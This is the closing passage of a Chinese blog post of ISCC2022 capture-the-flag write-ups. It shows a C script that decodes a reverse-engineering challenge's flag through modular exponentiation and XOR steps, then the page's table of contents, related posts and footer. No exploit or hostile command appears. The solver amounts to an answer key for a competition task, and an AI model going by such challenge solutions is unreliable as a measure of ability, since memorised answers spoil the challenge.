punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	<span class="token keyword">int</span> answear<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0x23</span><span class="token punctuation">,</span><span class="token number">0x4a</span><span class="token punctuation">,</span><span class="token number">0x7</span><span class="token punctuation">,</span><span class="token number">0x2b</span><span class="token punctuation">,</span><span class="token number">0x1d</span><span class="token punctuation">,</span><span class="token number">0x6</span><span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">,</span><span class="token number">0x2b</span><span class="token punctuation">,</span><span class="token number">0x5</span><span class="token punctuation">,</span><span class="token number">0x7</span><span class="token punctuation">,</span><span class="token number">0x6</span><span class="token punctuation">,</span><span class="token number">0x39</span><span class="token punctuation">,</span><span class="token number">0x2</span><span class="token punctuation">,</span><span class="token number">0x6</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token number">0x21</span><span class="token punctuation">,</span><span class="token number">0x4b</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">,</span><span class="token number">0x39</span><span class="token punctuation">,</span><span class="token number">0x2</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token keyword">int</span> e<span class="token punctuation">,</span> n<span class="token punctuation">,</span> d<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">int</span> count<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token keyword">int</span> a<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token keyword">int</span> i<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	e <span class="token operator">=</span> <span class="token number">37</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	n <span class="token operator">=</span> <span class="token number">77</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	d <span class="token operator">=</span> <span class="token number">37</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	<span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> d<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>			a <span class="token operator">=</span> a <span class="token operator">*</span> answear<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> n<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>		flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>		a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>		flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">70</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>		flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">63</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	<span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">12</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>		flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> flag<span class="token punctuation">[</span><span class="token number">24</span> <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>		flag<span class="token punctuation">[</span><span class="token number">24</span> <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^=</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>		flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> flag<span class="token punctuation">[</span><span class="token number">24</span> <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>	<span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>		flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">15</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220524210859590.png" alt="image-20220524210859590"></p><div class="tags"><a href="/tags/ISCC/" rel="tag"><i class="ic i-tag"></i> ISCC</a></div></div><footer><div class="meta"><span id="2022/09/23/wp/ISCC2022/" class="item leancloud_visitors" data-flag-title="ISCC2022" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Clown <i class="ic i-at"><em>@</em></i></li><li class="link"><strong>本文链接：</strong> <a href="https://blog.xcu.icu/2022/09/23/wp/ISCC2022/" title="ISCC2022">https://blog.xcu.icu/2022/09/23/wp/ISCC2022/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"></div><div class="item right"><a href="/2022/10/24/web/user.ini%E5%92%8Chtaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;36.jpg" title="user.ini和htaccess文件的利用"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> Web</span><h3>user.ini和htaccess文件的利用</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">1.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#create_id"><span class="toc-number">1.0.1.</span> <span class="toc-text">create_id</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sim_treasure"><span class="toc-number">1.0.2.</span> <span class="toc-text">sim_treasure</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%B3%E4%B8%80%E8%B7%B3"><span class="toc-number">1.0.3.</span> <span class="toc-text">跳一跳</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#untidy_note"><span class="toc-number">1.0.4.</span> <span class="toc-text">untidy_note</span></a></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">2.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%AC%E5%A5%A5%E4%BC%9A"><span class="toc-number">2.0.1.</span> <span class="toc-text">冬奥会</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%B1%E5%9B%BD%E6%95%AC%E4%B8%9A%E5%A5%BD%E9%9D%92%E5%B9%B4-2"><span class="toc-number">2.0.2.</span> <span class="toc-text">爱国敬业好青年 - 2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pop2022"><span class="toc-number">2.0.3.</span> <span class="toc-text">Pop2022</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#easy-sql"><span class="toc-number">2.0.4.</span> <span class="toc-text">Easy-SQL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#findme"><span class="toc-number">2.0.5.</span> <span class="toc-text">findme</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A9%E6%88%91%E5%BA%B7%E5%BA%B7"><span class="toc-number">2.0.6.</span> <span class="toc-text">让我康康！</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse"><span class="toc-number">3.</span> <span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#getthetable"><span class="toc-number">3.0.1.</span> <span class="toc-text">GetTheTable</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#amys-code"><span class="toc-number">3.0.2.</span> <span class="toc-text">Amy&#39;s Code</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#how_decode"><span class="toc-number">3.0.3.</span> <span class="toc-text">How_decode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sad-code"><span class="toc-number">3.0.4.</span> <span class="toc-text">Sad Code</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vigenerelike"><span class="toc-number">3.0.5.</span> <span class="toc-text">VigenereLike</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bobs-code"><span class="toc-number">3.0.6.</span> <span class="toc-text">Bob&#39;s Code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">4.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2022%E5%86%AC%E5%A5%A5%E4%BC%9A"><span class="toc-number">4.0.1.</span> <span class="toc-text">2022 冬奥会</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E6%9D%BF%E5%B0%8F%E5%B0%86%E8%8B%8F%E7%BF%8A%E9%B8%A3"><span class="toc-number">4.0.2.</span> <span class="toc-text">单板小将苏翊鸣</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%90%E7%A7%98%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">4.0.3.</span> <span class="toc-text">隐秘的信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%99%8D%E7%BB%B4%E6%89%93%E5%87%BB"><span class="toc-number">4.0.4.</span> <span class="toc-text">降维打击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%97%8F%E5%9C%A8%E6%98%9F%E7%A9%BA%E4%B8%AD%E7%9A%84%E8%AF%97-1"><span class="toc-number">4.0.5.</span> <span class="toc-text">藏在星空中的诗 - 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%97%8F%E5%9C%A8%E6%98%9F%E7%A9%BA%E4%B8%AD%E7%9A%84%E8%AF%97-2"><span class="toc-number">4.0.6.</span> <span class="toc-text">藏在星空中的诗 - 2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9C%9F%E7%9B%B8%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA"><span class="toc-number">4.0.7.</span> <span class="toc-text">真相只有一个</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mobile"><span class="toc-number">5.</span> <span class="toc-text">MOBILE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mobilea"><span class="toc-number">5.0.1.</span> <span class="toc-text">MobileA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%82%E5%8F%B0%E8%B5%9B"><span class="toc-number">6.</span> <span class="toc-text">擂台赛</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-2"><span class="toc-number">6.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#melody"><span class="toc-number">6.1.1.</span> <span class="toc-text">Melody</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mobile-2"><span class="toc-number">6.2.</span> <span class="toc-text">MOBILE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mobile-analysis"><span class="toc-number">6.2.1.</span> <span class="toc-text">Mobile Analysis</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#revese"><span class="toc-number">6.3.</span> <span class="toc-text">REVESE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#easyre"><span class="toc-number">6.3.1.</span> <span class="toc-text">Easyre</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#encode"><span class="toc-number">6.3.2.</span> <span class="toc-text">Encode</span></a></li></ol></li></ol></li></div><div class="related panel pjax" data-title="系列文章"><ul><li class="active"><a href="/2022/09/23/wp/ISCC2022/" rel="bookmark" title="ISCC2022">ISCC2022</a></li><li><a href="/2023/04/05/wp/GKCTF2020/" rel="bookmark" title="GKCTF2020WP">GKCTF2020WP</a></li><li><a href="/2023/06/01/wp/ISCC2023/" rel="bookmark" title="ISCC2023">ISCC2023</a></li><li><a href="/2023/08/17/wp/VNCTF2021/" rel="bookmark" title="VNCTF2021">VNCTF2021</a></li><li><a href="/2023/11/04/wp/%E6%A5%BC%E4%B8%8A%E8%AF%B7%E8%AE%A9%E8%B7%AF/" rel="bookmark" title="第三届“鹏程杯”（初赛）">第三届“鹏程杯”（初赛）</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Clown" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Clown</p><div class="description" itemprop="description">一个妄想全栈web小废物</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">105</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">17</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">59</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nsb3duLXE=" title="https:&#x2F;&#x2F;github.com&#x2F;clown-q"><i class="ic i-github"></i></span> <span class="exturl item email" data-url="bWFpbHRvOjI2NDIxMzczNjVAcXEuY29t" title="mailto:2642137365@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/InternalNet/" title="分类于 内网">内网</a></div><span><a href="/2024/03/14/InternalNet/ACK4/" title="红日靶机4">红日靶机4</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Vulnhub/" title="分类于 Vulnhub">Vulnhub</a></div><span><a href="/2024/01/21/Vulnhub/VulnHub-DC%E7%AF%87DC-5/" title="DC-5">DC-5</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/database/" title="分类于 数据库">数据库</a></div><span><a href="/2022/12/09/database/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%8C%E6%95%B4%E6%80%A7/" title="数据库的完整性">数据库的完整性</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" title="分类于 服务攻防">服务攻防</a></div><span><a href="/2024/03/04/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-IIS/" title="IIS漏洞复现">IIS漏洞复现</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/java%E5%AE%89%E5%85%A8/" title="分类于 java安全">java安全</a></div><span><a href="/2023/08/03/java%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1/" title="CC1">CC1</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/ctfshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2022/10/25/ctfshow/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="CTFshow-web入门信息收集">CTFshow-web入门信息收集</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/ctfshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2022/11/01/ctfshow/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="CTFshow-web入门命令执行">CTFshow-web入门命令执行</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/web/" title="分类于 Web">Web</a></div><span><a href="/2022/10/31/web/CSRF&SSRF/" title="CSRF&amp;SSRF">CSRF&SSRF</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Vulnhub/" title="分类于 Vulnhub">Vulnhub</a></div><span><a href="/2024/01/23/Vulnhub/VulnHub-DC%E7%AF%87DC-6/" title="DC-6">DC-6</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%9D%82%E8%AE%B0/" title="分类于 杂记">杂记</a></div><span><a href="/2023/08/15/Casualessay/Java%E7%BD%91%E7%BB%9C%E5%8C%96%E7%BC%96%E7%A8%8B/" title="Java网络化编程">Java网络化编程</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2022 – <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Clown @ ClownのBlog</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">1m 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">15:18</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2022/09/23/wp/ISCC2022/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->